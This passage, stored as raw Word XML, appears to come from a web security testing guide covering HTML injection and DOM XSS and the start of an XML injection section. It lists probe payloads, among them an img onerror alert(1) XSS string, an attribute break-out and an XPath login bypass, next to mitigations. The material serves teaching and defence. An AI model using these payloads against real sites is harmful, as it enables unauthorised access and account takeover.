      <w:bookmarkStart w:id="165" w:name="_Toc208408636"/>
      <w:r>
        <w:t>Detection Workflow</w:t>
      </w:r>
      <w:bookmarkEnd w:id="165"/>
    </w:p>
    <w:p w14:paraId="75E2A90D" w14:textId="77777777" w:rsidR="003F0189" w:rsidRDefault="003F0189">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1. Map sources → sinks (e.g., </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>location.search</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>innerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>2. Benign probes: &lt;u&gt;X&lt;/u&gt;, &lt;/p&gt;&lt;div id=owned&gt;.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>3. Boundary discovery: escape quotes in attributes.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>4. Execution (labs only): &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">=x </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=alert(1)&gt;.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">5. Instrumentation: hook </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>innerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> or use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>MutationObserver</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="137C3E01" w14:textId="29D04E80" w:rsidR="003F0189" w:rsidRDefault="003F0189" w:rsidP="00CC14F9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:bookmarkStart w:id="166" w:name="_Toc208408637"/>
      <w:r>
        <w:t>Payload Logic</w:t>
      </w:r>
      <w:bookmarkEnd w:id="166"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20635D98" w14:textId="77777777" w:rsidR="003F0189" w:rsidRDefault="003F0189">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1. Non-executable markers: &lt;u&gt;test&lt;/u&gt;, &lt;/div&gt;&lt;div id=owned&gt;.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>2. Attribute break-out: " title="hovered.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>3. Event attributes (lab): &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">=x </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=alert(1)&gt;.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>4. URL attributes: inject controlled external link.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F0A50A9" w14:textId="06976835" w:rsidR="003F0189" w:rsidRDefault="003F0189" w:rsidP="00CC14F9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:bookmarkStart w:id="167" w:name="_Toc208408638"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Mitigation Strategies</w:t>
      </w:r>
      <w:bookmarkEnd w:id="167"/>
    </w:p>
    <w:p w14:paraId="69C51EF6" w14:textId="77777777" w:rsidR="003F0189" w:rsidRDefault="003F0189">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">A. Prefer text APIs: Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>textContent</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>innerText</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> instead of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>innerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>document.write</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>B. Contextual output encoding: escape based on HTML context.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>C. Sanitization: allow-list tags and strip dangerous attributes/protocols.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">D. Content-Security-Policy: block inline handlers and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>javascript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>: URLs.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">E. Framework hygiene: avoid unsafe APIs like React </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>dangerouslySetInnerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Vue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> v-html.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A41ACB7" w14:textId="61DE7FBC" w:rsidR="003F0189" w:rsidRDefault="003F0189" w:rsidP="00CC14F9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:bookmarkStart w:id="168" w:name="_Toc208408639"/>
      <w:r>
        <w:t>Triage &amp; Impact</w:t>
      </w:r>
      <w:bookmarkEnd w:id="168"/>
    </w:p>
    <w:p w14:paraId="548BD128" w14:textId="77777777" w:rsidR="003F0189" w:rsidRDefault="003F0189">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1053189400"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>HTML-only injection can still:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Inject phishing UIs.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Tamper with displayed data (invoices, balances).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Redirect users via injected links.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Escalation to DOM XSS leads to session compromise and account takeover.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="413B7C2C" w14:textId="77777777" w:rsidR="003F0189" w:rsidRDefault="003F0189" w:rsidP="00CC14F9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F866751" w14:textId="5326CCBD" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="006E278A">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="169" w:name="_Toc208408640"/>
      <w:r>
        <w:t>XML Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="169"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64DB7580" w14:textId="22AA4851" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="006E278A">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="170" w:name="_Toc208408641"/>
      <w:r>
        <w:t>What is XML Injection?</w:t>
      </w:r>
      <w:bookmarkEnd w:id="170"/>
    </w:p>
    <w:p w14:paraId="52378A03" w14:textId="77777777" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">XML Injection occurs when an application incorporates user input into XML documents or XPath queries without proper sanitization. Attackers can alter the structure of XML or queries to bypass authentication, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>exfiltrate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> data, or trigger XXE attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B67F1D" w14:textId="0F5C2087" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="00321FC0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkStart w:id="171" w:name="_Toc208408642"/>
      <w:r>
        <w:t>Where XML Injection Happens</w:t>
      </w:r>
      <w:bookmarkEnd w:id="171"/>
    </w:p>
    <w:p w14:paraId="2FE68E00" w14:textId="77777777" w:rsidR="00F15F47" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Login/authentication systems using XPath</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31FC2464" w14:textId="77777777" w:rsidR="00F15F47" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>SOAP, SAML, XML-RPC APIs with XML payloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F66747" w14:textId="77777777" w:rsidR="00F15F47" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Custom XML data/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>config</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> storage</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5F3894" w14:textId="5FC6CEBF" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>File upload/parsing features (e.g., SVG, Office XML)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="430A4D06" w14:textId="7860A8D1" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="00F15F47">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="172" w:name="_Toc208408643"/>
      <w:r>
        <w:t>Detection Workflow</w:t>
      </w:r>
      <w:bookmarkEnd w:id="172"/>
    </w:p>
    <w:p w14:paraId="67CCEC71" w14:textId="77777777" w:rsidR="00F15F47" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Identify XML usage: look for Content-Type: application/xml or SOAP/SAML requests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E6B1355" w14:textId="77777777" w:rsidR="00F15F47" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Inject special chars (‘ “ &lt; &gt; &amp;) to test for parser errors.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C13FC58" w14:textId="77777777" w:rsidR="00F15F47" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Probe by injecting nodes: &lt;test&gt;probe&lt;/test&gt;.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43FE8F0C" w14:textId="77777777" w:rsidR="00F15F47" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Attempt XPath login bypass: ‘ or ‘1’=’1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B617346" w14:textId="77777777" w:rsidR="00BA15D1" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use Blind XPath queries with count() or substring().</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3D7848" w14:textId="1112700E" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Insert safe ENTITY test to check for XXE.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76DB9B98" w14:textId="77777777" w:rsidR="00BA15D1" w:rsidRDefault="00BA15D1" w:rsidP="00BA15D1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D3C2C8E" w14:textId="07377DA3" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="00BA15D1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="173" w:name="_Toc208408644"/>
      <w:r>
        <w:t>Exploitation Techniques</w:t>
      </w:r>
      <w:bookmarkEnd w:id="173"/>
    </w:p>
    <w:p w14:paraId="174ADF8A" w14:textId="77777777" w:rsidR="00871CD4" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>XML Content Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0980E7CA" w14:textId="77777777" w:rsidR="00871CD4" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Manipulate XML structure by adding nodes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CEEF317" w14:textId="77777777" w:rsidR="00871CD4" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Example:</w:t>
      </w:r>
      <w:r w:rsidR="00871CD4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>&lt;order&gt;&lt;item&gt;Book&lt;/item&gt;&lt;/order&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3C7455" w14:textId="232C740E" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Payload:</w:t>
      </w:r>
      <w:r w:rsidR="00871CD4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>&lt;item&gt;Book&lt;/item&gt;&lt;item&gt;Hacked&lt;/item&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B81BEC" w14:textId="77777777" w:rsidR="00871CD4" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>XPath Injection</w:t>
      </w:r>
    </w:p>
